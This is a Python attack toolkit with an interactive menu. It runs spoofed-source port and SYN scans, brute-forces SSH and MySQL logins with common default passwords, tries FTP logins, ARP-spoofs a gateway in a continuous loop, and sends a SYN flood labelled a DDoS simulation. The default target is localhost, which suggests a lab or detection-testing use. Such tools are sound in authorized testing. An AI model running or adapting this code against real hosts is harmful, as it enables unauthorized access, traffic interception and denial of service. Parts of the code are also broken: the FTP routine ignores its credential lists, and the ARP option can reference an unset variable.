import paramiko
import ftplib
import requests
import mysql.connector
import subprocess
from mysql.connector import errors
from scapy.all import send, ARP, IP, TCP
from time import sleep
import socket
import subprocess

# Port Scan using Nmap via subprocess with correct interface
def scan_ports(ip_range, src_ip="192.168.1.10", interface="lo"):
    print(f"Scanning ports on {ip_range} from source IP {src_ip} using interface {interface}")
    try:
        # Run nmap command with source IP and interface set
        command = [
            "nmap", 
            "-sS",  # SYN scan
            "-S", src_ip,  # Set the source IP (correct option for nmap)
            "-e", interface,  # Specify the network interface to use
            "-p", "20-1024",  # Port range (you can modify this)
            ip_range
        ]
        scan_result = subprocess.run(command, capture_output=True, text=True)
        if scan_result.returncode == 0:
            print("Nmap scan result:")
            print(scan_result.stdout)
        else:
            print(f"Error during nmap scan: {scan_result.stderr}")
    except Exception as e:
        print(f"Error when scanning ports: {e}")

# SYN Scan
def syn_scan(target_ip, src_ip="192.168.1.10"):
    print(f"Performing SYN scan on {target_ip} from {src_ip}")
    try:
        for port in range(20, 40):
            packet = IP(src=src_ip, dst=target_ip) / TCP(dport=port, flags='S')
            send(packet, verbose=0)
            sleep(0.1)
        print("[+] SYN Scan completed")
    except Exception as e:
        print(f"Error during SYN scan: {e}")

# Brute force SSH
def brute_force_ssh(target_ip, port=22):
    usernames = ['admin', 'root', 'user']  # List of usernames to test
    passwords = ['123456', 'password', 'admin', 'admin123', 'azerty', 'Azerty123']  # List of passwords to test
    for user in usernames:
        for passwd in passwords:
            sleep(1)
            try:
                print(f"Attempting SSH login with {user}:{passwd}")
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(target_ip, port=port, username=user, password=passwd, timeout=2)
                print("[+] SSH Login Successful")
                client.close()
                return
            except paramiko.AuthenticationException:
                print("[-] SSH Login Failed")
            except Exception as e:
                print(f"Error: {e}")

# FTP Attack
def ftp_attack(target_ip, port=21):
    print(f"Attempting FTP login to {target_ip} on port {port}...")
    usernames = ['admin', 'root', 'user']  # List of usernames to test
    passwords = ['123456', 'password', 'admin', 'admin123', 'azerty', 'Azerty123']  # List of passwords to test
    # Initialize the FTP connection
    for user in usernames:
        for passwd in passwords:
            try:
                ftp = ftplib.FTP()
                # Connect to the target IP and port
                ftp.connect(target_ip, port, timeout=10)  # Added timeout for robustness
                # Attempt anonymous login
                ftp.login(user="anonymous", passwd="test@example.com")
                print("[+] FTP Login Successful")
                # Close the connection
                ftp.quit()
            except ftplib.error_perm as perm_err:
                # Handle permission errors (e.g., login failed)
                print(f"[-] Permission Error: {perm_err}")
            except ftplib.error_temp as temp_err:
                # Handle temporary errors (e.g., service unavailable)
                print(f"[-] Temporary Error: {temp_err}")
            except ftplib.error_proto as proto_err:
                # Handle protocol errors
                print(f"[-] Protocol Error: {proto_err}")
            except Exception as e:
                # Handle other general exceptions
                print(f"[-] FTP Attack Failed: {e}")

# HTTP Probe
def http_probe(target_ip, port=80):
    try:
        print(f"Probing HTTP server on {target_ip}")
        response = requests.get(f"http://{target_ip}:{port}")
        print(f"[+] HTTP Response: {response.status_code}")
    except Exception as e:
        print(f"[-] HTTP Probe Failed: {e}")

# MySQL Brute Force
def mysql_brute_force(target_ip, port=3306):
    usernames = ['root', 'admin', 'test']
    passwords = ['password', '12345', 'admin']
    for user in usernames:
        for passwd in passwords:
            try:
                print(f"Attempting MySQL login with {user}:{passwd}")
                conn = mysql.connector.connect(
                    host=target_ip,
                    port=port,
                    user=user,
                    password=passwd
                )
                print("[+] MySQL Login Successful")
                conn.close()
                return
            except errors.ProgrammingError:
                print("[-] MySQL Login Failed")
            except Exception as e:
                print(f"Error: {e}")

# ARP Spoofing
def arp_spoof(target_ip, target_mac, gateway_ip, src_ip="192.168.1.10"):
    print(f"Performing ARP spoofing on {target_ip} from {src_ip}")
    try:
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, src=src_ip)
        send(packet, verbose=0, loop=1, inter=2)
    except Exception as e:
        print(f"Error during ARP spoofing: {e}")

# DDoS Simulation
def simulate_ddos(target_ip, src_ip="192.168.1.10"):
    print(f"Simulating DDoS attack on {target_ip} from {src_ip}")
    try:
        for _ in range(200):
            packet = IP(src=src_ip, dst=target_ip) / TCP(dport=80, flags='S')
            send(packet, verbose=0)
            sleep(0.05)
        print("[+] DDoS simulation completed")
    except Exception as e:
        print(f"Error during DDoS simulation: {e}")

if __name__ == "__main__":
    target_ip = "127.0.0.1"  # Replace with target IP

    while True:
        print("\nSelect an attack to perform:")
        print("1. Port Scan")
        print("2. SYN Scan")
        print("3. Brute Force SSH")
        print("4. FTP Attack")
        print("5. HTTP Probe")
        print("6. MySQL Brute Force")
        print("7. DDoS Simulation")
        print("8. ARP Spoofing")
        print("9. Quit")

        choice = input("Enter your choice: ")
        # Ask for custom source IP for attacks
        
        if choice == "1":
            src_ip = input("Enter source IP (default is 192.168.1.10): ") or  "192.168.1.10"
            scan_ports(target_ip, src_ip)
        elif choice == "2":
            src_ip = input("Enter source IP (default is 192.168.1.10): ") or  "192.168.1.10"
            syn_scan(target_ip, src_ip)
        elif choice == "3":
            brute_force_ssh(target_ip, 22)
        elif choice == "4":
            ftp_attack(target_ip, 21)
        elif choice == "5":
            http_probe(target_ip, 80)
        elif choice == "6":
            mysql_brute_force(target_ip)
        elif choice == "7":
            src_ip = input("Enter source IP (default is 192.168.1.10): ") or  "192.168.1.10"
            simulate_ddos(target_ip, src_ip)
        elif choice == "8":
            target_mac = input("Enter target MAC address: ")
            gateway_ip = input("Enter gateway IP: ")
            arp_spoof(target_ip, target_mac, gateway_ip, src_ip)
        elif choice == "9":
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please try again.")

